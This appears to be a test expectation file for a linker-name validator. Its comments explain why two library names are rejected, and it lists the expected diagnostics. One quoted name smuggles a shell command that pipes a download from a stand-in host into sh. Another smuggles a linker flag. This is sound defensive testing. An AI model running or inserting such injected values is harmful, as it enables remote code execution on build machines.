# Illegal twice: a `from library "NAME"` name goes on the linker's command
# line, so it may only be letters, digits, '_', '.', '+' and '-', and may not
# begin with '-'.
#
#   line 9    `m; curl evil.example | sh` is not a name the linker could look
#             up (and used to be a shell command, when the link line was one
#             string)
#   line 13   `framework:-Wl,-rpath,/tmp` begins with '-' after the prefix,
#             which the linker would read as a flag
#
# The header-form block on line 19 carries a slash and is NOT reported: it is
# documentation and reaches no command line.
9:1: is not a name the linker could look up
13:1: begins with '-'
